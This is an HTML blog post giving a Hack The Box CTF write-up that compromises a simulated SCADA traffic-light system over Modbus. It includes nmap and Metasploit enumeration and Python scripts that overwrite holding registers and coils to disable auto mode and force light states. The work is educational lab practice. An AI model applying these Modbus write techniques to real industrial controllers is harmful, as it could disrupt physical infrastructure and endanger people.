<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB UNI CTF : Light The Way | drMoscovium</title><meta name=keywords content="Hack The Box"><meta name=description content="Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
* Conrtol processes * Monitor * Interact with devices * Record events For more information on SCADA"><meta name=author content="drMoscovium"><link rel=canonical href=https://drmoscovium.xyz/post/writeups/htb-uni-ctf/lighttheway/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://drmoscovium.xyz/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://drmoscovium.xyz/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://drmoscovium.xyz/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://drmoscovium.xyz/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://drmoscovium.xyz/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB UNI CTF : Light The Way"><meta property="og:description" content="Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
* Conrtol processes * Monitor * Interact with devices * Record events For more information on SCADA"><meta property="og:type" content="article"><meta property="og:url" content="https://drmoscovium.xyz/post/writeups/htb-uni-ctf/lighttheway/"><meta property="og:image" content="https://drmoscovium.xyz/hackthebox/unictf.png"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-11-21T23:22:26-05:00"><meta property="article:modified_time" content="2021-11-21T23:22:26-05:00"><meta property="og:site_name" content="drMoscovium"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://drmoscovium.xyz/hackthebox/unictf.png"><meta name=twitter:title content="HTB UNI CTF : Light The Way"><meta name=twitter:description content="Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
* Conrtol processes * Monitor * Interact with devices * Record events For more information on SCADA"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://drmoscovium.xyz/post/"},{"@type":"ListItem","position":2,"name":"HTB UNI CTF : Light The Way","item":"https://drmoscovium.xyz/post/writeups/htb-uni-ctf/lighttheway/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB UNI CTF : Light The Way","name":"HTB UNI CTF : Light The Way","description":"Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.\nSCADA Supervisory control and data acquisition is a system that allows industrial organizations to:\n* Conrtol processes * Monitor * Interact with devices * Record events For more information on SCADA","keywords":["Hack The Box"],"articleBody":"Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.\nSCADA Supervisory control and data acquisition is a system that allows industrial organizations to:\n* Conrtol processes * Monitor * Interact with devices * Record events For more information on SCADA\nStarting Point For this specific challenge, we needed to compromise traffic lights. There wasn’t much information to work with, given only the IP address of the system. It was also in the same network, which makes things easier.\nThe given IP was : 10.129.96.95\nA website and the IP was all the information that I had. So, where did I begin?\nNmap Yep, nmap. It allows us to scan the system and find information on it.\n1 nmap -p- 10.129.96.95 -sCV Key Points:\n* PORT 22 : used for SSH, I wouldn't even try to attack it * PORT 80 : running nginx server for the front end * PORT 502: This is the interesting port. (I didn't knew it was interesting until I googled and found out that modbus uses it) After figuring those stuff out, now’s the time to enumerate more information on the Modbus.\n1 nmap -p 502 --script modbus-discover 10.129.96.95 Didn’t give much but it confirms that Modbus is running on port 502.\nMore info! What I have here isn’t enough to make the exploit. So, what should I do?\nTurning back to my good old friend, internet I found a metaspolit script auxiliary/scanner/scada/modbus_findunitid\nUsing the script, I was able to figure out that there are more than one unit in the given SCADA system. I didn’t let the script complete, but there are more than 200 units.\nWhy are there so many? There are 6 junctions in the picture, and if there are more than 200 does each unit control one light?\nBefore answerinng that question let’s first look at what data the first unit has.\nGet DATA Let’s search if there’s any more metaspolit script that we can use.\n1 msf6\u003e search modbus After searching for modbus, I found 6 modules/scripts\n1 2 3 4 5 6 7 8 9 10 11 12 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/analyze/modbus_zip normal No Extract zip from Modbus communication 1 auxiliary/scanner/scada/modbus_banner_grabbing normal No Modbus Banner Grabbing 2 auxiliary/scanner/scada/modbusclient normal No Modbus Client Utility 3 auxiliary/scanner/scada/modbus_findunitid 2012-10-28 normal No Modbus Unit ID and Station ID Enumerator 4 auxiliary/scanner/scada/modbusdetect 2011-11-01 normal No Modbus Version Scanner 5 auxiliary/admin/scada/modicon_stux_transfer 2012-04-05 normal No Schneider Modicon Ladder Logic Upload/Download 6 auxiliary/admin/scada/modicon_command 2012-04-05 normal No Schneider Modicon Remote START/STOP Command Modbusclient module seems to be the most useful for this case.\n1 2 msf6\u003e use auxiliary/scanner/scada/modbusclient msf6 auxiliary(scanner/scada/modbusclient)\u003e show options So the RHOST for this instance will be the IP address : 10.129.96.95\n1 set RHOST 10.129.96.95 We need to set where we want to start reading the DATA from to do that we need wo set the DATA_ADDRESS field\n1 set DATA_ADDRESS 0 Then we need to set how many DATA_ADDRESS we want to read.\n1 set NUMBER 18 Let’s see what those numbers mean.\nThis small python command takes the arr of int and converts to a string.\n1 2 3 arr = [97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 116, 114, 117, 101] print(\"\".join(chr(x) for x in arr)) With the python script I was able to get a string: auto_mode:true\nSetting it to manual If I remember correctly the description of the challenge wants us to set it to manual mode. Which means we need to set the auto_mode to false.\n1 print([ord(x) for x in \"auto_mode:false\"]) Used this python script to get the numbers that we need to send in order to set the SCADA system to false.\n1 [97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 102, 97, 108, 115, 101] I wrote a simple python script that uses the Perl Modbus library to write to the holding registry. Yea, I later figured out that python had a library to connect to modbus, but anyways it works.\n1 2 3 4 5 import subprocess for i in range(1,20): # : f a l s e cmd = f\"modbus write -w -s {i} 10.129.96.95 10 58 102 97 108 115 101\" subprocess.run(cmd.split(\" \")) modbus {command} {type} {slaveid} {target_ip} {data_address} {information_to_write}\nI set it to the first 20 to see if that would make any difference. It didn’t make any visual difference. But if I look at the registers again, it changed the values.\nFirst one is before running the script, second one is after running the python script.\nSo, if that didn’t change anything, what can I do?\nCoils also store values, and I can read and write it.\nReading Coils 1 msf6 auxiliary(scanner/scada/modbusclient)\u003e set action READ_COILS Reading the first 18 coils, it was all just bunch of 0s so I decided to read 2000 of them to see if I find anything good.\n1 msf6 auxiliary(scanner/scada/modbusclient)\u003e set NUMBER 2000 After trying to get 2000 coils, I can see some interesting information. There are bunch of 1 in the middle.\nLet’s see what other Units have.\n1 msf6 auxiliary(scanner/scada/modbusclient)\u003e set UNIT_NUMBER 2 UNIT_NUMBER determines which slave node we are viewing.\nAfter looking through 7 to 8 of them I found out that only 6 of it hold any valuable data. So, I concluded that each unit represents one junction.\n1 2 3 4 5 6 7 8 9 10 11 12 from pyModbusTCP.client import ModbusClient data_address = {} for i in range(1,7): c = ModbusClient(host=\"10.129.96.95\", port=\"502\", unit_id=i, auto_open=True) regs = c.read_coils(0,2000) data_address[i] = regs.index(True) print(data_address) I wrote this script to get the DATA_ADDRESS of all the 1/True places.\n1 {1: 571, 2: 1921, 3: 531, 4: 1267, 5: 925, 6: 888} The exploit? Now I have all the necessary information on the data address of where they are reading the traffic data from, I can create a payload to change the traffic lights.\nThe first three bits represents the North side of the light, and goes in order of\nGreen Yellow Red\nIF we curl the api http://10.129.96.95/api we can see value for all the colors and the direction.\nAfter doing some digging I found out that the API doesn’t represent the data in the same way the registers stores the data.\nIn the registers we need to pass in data as follow:\n1 NG NY NR EG EY ER SG SY SR WG WY WR Looking at the picture we need to change the west side to green because the car is about to turn towards west for the first junction, and we have to turn the East side to Green for the 2nd and 4th junction, and finally the north side for 6th junction.\nSo the values for junction one are as follow:\n1 [False, False, True, False, False, True, False, False, True, True, False, False] This will turn on the green light on the west.\n1 [False, False, True, False, False, True, False, False, True, False, False, True] So, What I was saying about the direction didn’t make any sense, I had to play around for a long time before I figured out the correct light to turn on. The placement of the lights didn’t sense to me, it might be becuase the difference in driving in different country.\nThe following script did the job.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from pyModbusTCP.client import ModbusClient data_address = {} c = ModbusClient(host=\"10.129.96.95\", port=\"502\", unit_id=1, auto_open=True) for i in range(1,7): c.unit_id(i) regs = c.read_coils(0,2000) data_address[i] = regs.index(True) c.unit_id(1) c.write_multiple_coils(571,[False, False, True, False, False, True, False, False, True, True, False, False]) c.unit_id(2) c.write_multiple_coils(1920, [True, False, False, False, False, True,False, False, True, False, False, True]) c.unit_id(4) c.write_multiple_coils(1266, [False, False, True, False, False, True,False, False, True, True, False, False]) c.unit_id(6) c.write_multiple_coils(886,[False, False, True, False, False, True, False, False, True, True, False, False]) After running the script, the car moved and I found the flag.\nFlag:HTB{w3_se3_tH3_l1ght}\n","wordCount":"1375","inLanguage":"en","image":"https://drmoscovium.xyz/hackthebox/unictf.png","datePublished":"2021-11-21T23:22:26-05:00","dateModified":"2021-11-21T23:22:26-05:00","author":{"@type":"Person","name":"drMoscovium"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://drmoscovium.xyz/post/writeups/htb-uni-ctf/lighttheway/"},"publisher":{"@type":"Organization","name":"drMoscovium","logo":{"@type":"ImageObject","url":"https://drmoscovium.xyz/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://drmoscovium.xyz/ accesskey=h title="Home (Alt + H)"><img src=https://drmoscovium.xyz/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://drmoscovium.xyz/projects/ title=Projects><span>Projects</span></a></li><li><a href=https://drmoscovium.xyz/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://git.drmoscovium.xyz title=drmoscovium.xyz><span>drmoscovium.xyz</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://drmoscovium.xyz/>Home</a>&nbsp;»&nbsp;<a href=https://drmoscovium.xyz/post/>Posts</a></div><h1 class=post-title>HTB UNI CTF : Light The Way</h1><div class=post-meta><span title='2021-11-21 23:22:26 -0500 EST'>November 21, 2021</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1375 words&nbsp;·&nbsp;drMoscovium&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/post/writeups/HTB-UNI-CTF/LightTheWay.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><figure class=entry-cover><img loading=lazy src=https://drmoscovium.xyz/hackthebox/unictf.png alt="UNI CTF"></figure><div class=post-content><p>Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.</p><p><img loading=lazy src=/lighttheway/question.png alt></p><h2 id=scada>SCADA<a hidden class=anchor aria-hidden=true href=#scada>#</a></h2><p>Supervisory control and data acquisition is a system that allows industrial organizations to:</p><pre><code>* Conrtol processes
* Monitor
* Interact with devices
* Record events
</code></pre><p><a href=https://inductiveautomation.com/resources/article/what-is-scada>For more information on SCADA</a></p><h2 id=starting-point>Starting Point<a hidden class=anchor aria-hidden=true href=#starting-point>#</a></h2><p>For this specific challenge, we needed to compromise traffic lights. There wasn&rsquo;t much information to work with, given only the IP address of the system. It was also in the same network, which makes things easier.</p><p><img loading=lazy src=/lighttheway/HMI.png alt></p><p>The given IP was : <code>10.129.96.95</code></p><p>A website and the IP was all the information that I had. So, where did I begin?</p><h2 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h2><p>Yep, nmap. It allows us to scan the system and find information on it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nmap -p- 10.129.96.95 -sCV
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/lighttheway/nmap.png alt=test></p><p>Key Points:</p><pre><code>* PORT 22 : used for SSH, I wouldn't even try to attack it
* PORT 80 : running nginx server for the front end
* PORT 502: This is the interesting port. (I didn't knew it was interesting until I googled and found out that modbus uses it)
</code></pre><p>After figuring those stuff out, now&rsquo;s the time to enumerate more information on the Modbus.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nmap -p 502 --script modbus-discover 10.129.96.95
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/lighttheway/nmap2.png alt></p><p>Didn&rsquo;t give much but it confirms that Modbus is running on port 502.</p><h3 id=more-info>More info!<a hidden class=anchor aria-hidden=true href=#more-info>#</a></h3><p><img loading=lazy src=https://c.tenor.com/ayUs509YzsIAAAAC/kid-bored.gif alt></p><p>What I have here isn&rsquo;t enough to make the exploit. So, what should I do?</p><p>Turning back to my good old friend, internet I found a metaspolit script <code>auxiliary/scanner/scada/modbus_findunitid</code></p><p>Using the script, I was able to figure out that there are more than one unit in the given SCADA system. I didn&rsquo;t let the script complete, but there are more than 200 units.</p><p><em><strong>Why are there so many?</strong></em>
There are 6 junctions in the picture, and if there are more than 200 does each unit control one light?</p><p>Before answerinng that question let&rsquo;s first look at what data the first unit has.</p><h2 id=get-data>Get DATA<a hidden class=anchor aria-hidden=true href=#get-data>#</a></h2><p>Let&rsquo;s search if there&rsquo;s any more metaspolit script that we can use.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf6&gt; search modbus
</span></span></code></pre></td></tr></table></div></div><p>After searching for modbus, I found 6 modules/scripts</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Matching Modules
</span></span><span class=line><span class=cl>================
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   #  Name                                            Disclosure Date  Rank    Check  Description
</span></span><span class=line><span class=cl>   -  ----                                            ---------------  ----    -----  -----------
</span></span><span class=line><span class=cl>   0  auxiliary/analyze/modbus_zip                                     normal  No     Extract zip from Modbus communication
</span></span><span class=line><span class=cl>   1  auxiliary/scanner/scada/modbus_banner_grabbing                   normal  No     Modbus Banner Grabbing
</span></span><span class=line><span class=cl>   2  auxiliary/scanner/scada/modbusclient                             normal  No     Modbus Client Utility
</span></span><span class=line><span class=cl>   3  auxiliary/scanner/scada/modbus_findunitid       2012-10-28       normal  No     Modbus Unit ID and Station ID Enumerator
</span></span><span class=line><span class=cl>   4  auxiliary/scanner/scada/modbusdetect            2011-11-01       normal  No     Modbus Version Scanner
</span></span><span class=line><span class=cl>   5  auxiliary/admin/scada/modicon_stux_transfer     2012-04-05       normal  No     Schneider Modicon Ladder Logic Upload/Download
</span></span><span class=line><span class=cl>   6  auxiliary/admin/scada/modicon_command           2012-04-05       normal  No     Schneider Modicon Remote START/STOP Command
</span></span></code></pre></td></tr></table></div></div><p>Modbusclient module seems to be the most useful for this case.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf6&gt; use auxiliary/scanner/scada/modbusclient
</span></span><span class=line><span class=cl>msf6 auxiliary(scanner/scada/modbusclient)&gt; show options
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/lighttheway/meta1.png alt></p><p>So the RHOST for this instance will be the IP address : <code>10.129.96.95</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>set RHOST 10.129.96.95
</span></span></code></pre></td></tr></table></div></div><p>We need to set where we want to start reading the DATA from to do that we need wo set the DATA_ADDRESS field</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>set DATA_ADDRESS 0
</span></span></code></pre></td></tr></table></div></div><p>Then we need to set how many DATA_ADDRESS we want to read.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>set NUMBER 18
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/lighttheway/meta2.png alt></p><p>Let&rsquo;s see what those numbers mean.</p><p>This small python command takes the arr of int and converts to a string.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>arr = [97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 116, 114, 117, 101]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>print(&#34;&#34;.join(chr(x) for x in arr))
</span></span></code></pre></td></tr></table></div></div><p>With the python script I was able to get a string: <code>auto_mode:true</code></p><h2 id=setting-it-to-manual>Setting it to manual<a hidden class=anchor aria-hidden=true href=#setting-it-to-manual>#</a></h2><p>If I remember correctly the description of the challenge wants us to set it to manual mode. Which means we need to set the auto_mode to false.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>print([ord(x) for x in &#34;auto_mode:false&#34;])
</span></span></code></pre></td></tr></table></div></div><p>Used this python script to get the numbers that we need to send in order to set the SCADA system to false.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 102, 97, 108, 115, 101]
</span></span></code></pre></td></tr></table></div></div><p>I wrote a simple python script that uses the Perl Modbus library to write to the holding registry.
<img loading=lazy src=https://c.tenor.com/zOAWdshu_I0AAAAd/boring-unimpressed.gif alt></p><p>Yea, I later figured out that python had a library to connect to modbus, but anyways it works.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import subprocess
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>for i in range(1,20):                           #  :  f   a   l   s   e
</span></span><span class=line><span class=cl>    cmd = f&#34;modbus write -w -s {i} 10.129.96.95 10 58 102 97 108 115 101&#34;
</span></span><span class=line><span class=cl>    subprocess.run(cmd.split(&#34; &#34;))
</span></span></code></pre></td></tr></table></div></div><p><code>modbus {command} {type} {slaveid} {target_ip} {data_address} {information_to_write}</code></p><p>I set it to the first 20 to see if that would make any difference. It didn&rsquo;t make any visual difference. But if I look at the registers again, it changed the values.</p><p><img loading=lazy src=/lighttheway/meta3.png alt>
<em>First one is before running the script, second one is after running the python script.</em></p><p>So, if that didn&rsquo;t change anything, what can I do?</p><p>Coils also store values, and I can read and write it.</p><h2 id=reading-coils>Reading Coils<a hidden class=anchor aria-hidden=true href=#reading-coils>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf6 auxiliary(scanner/scada/modbusclient)&gt; set action READ_COILS
</span></span></code></pre></td></tr></table></div></div><p>Reading the first 18 coils, it was all just bunch of 0s so I decided to read 2000 of them to see if I find anything good.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf6 auxiliary(scanner/scada/modbusclient)&gt; set NUMBER 2000
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/lighttheway/meta4.png alt></p><p>After trying to get 2000 coils, I can see some interesting information. There are bunch of 1 in the middle.</p><p>Let&rsquo;s see what other Units have.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf6 auxiliary(scanner/scada/modbusclient)&gt; set UNIT_NUMBER 2
</span></span></code></pre></td></tr></table></div></div><p>UNIT_NUMBER determines which slave node we are viewing.</p><p>After looking through 7 to 8 of them I found out that only 6 of it hold any valuable data. So, I concluded that each unit represents one junction.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pyModbusTCP.client import ModbusClient
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>data_address = {}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>for i in range(1,7):
</span></span><span class=line><span class=cl>    c = ModbusClient(host=&#34;10.129.96.95&#34;, port=&#34;502&#34;, unit_id=i, auto_open=True)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    regs = c.read_coils(0,2000)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    data_address[i] = regs.index(True)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>print(data_address)
</span></span></code></pre></td></tr></table></div></div><p>I wrote this script to get the DATA_ADDRESS of all the 1/True places.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{1: 571, 2: 1921, 3: 531, 4: 1267, 5: 925, 6: 888}
</span></span></code></pre></td></tr></table></div></div><h1 id=the-exploit>The exploit?<a hidden class=anchor aria-hidden=true href=#the-exploit>#</a></h1><p>Now I have all the necessary information on the data address of where they are reading the traffic data from, I can create a payload to change the traffic lights.</p><p>The first three bits represents the North side of the light, and goes in order of</p><p>Green Yellow Red</p><p>IF we curl the api <code>http://10.129.96.95/api</code> we can see value for all the colors and the direction.</p><p><img loading=lazy src=/lighttheway/curl.png alt></p><p>After doing some digging I found out that the API doesn&rsquo;t represent the data in the same way the registers stores the data.</p><p>In the registers we need to pass in data as follow:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>NG NY NR EG EY ER SG SY SR WG WY WR
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/lighttheway/lights.png alt></p><p>Looking at the picture we need to change the west side to green because the car is about to turn towards west for the first junction, and we have to turn the East side to Green for the 2nd and 4th junction, and finally the north side for 6th junction.</p><p>So the values for junction one are as follow:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[False, False, True, False, False, True, False, False, True, True, False, False]
</span></span></code></pre></td></tr></table></div></div><p>This will turn on the green light on the west.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[False, False, True, False, False, True, False, False, True, False, False, True]
</span></span></code></pre></td></tr></table></div></div><p>So, What I was saying about the direction didn&rsquo;t make any sense, I had to play around for a long time before I figured out the correct light to turn on. The placement of the lights didn&rsquo;t sense to me, it might be becuase the difference in driving in different country.</p><p>The following script did the job.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
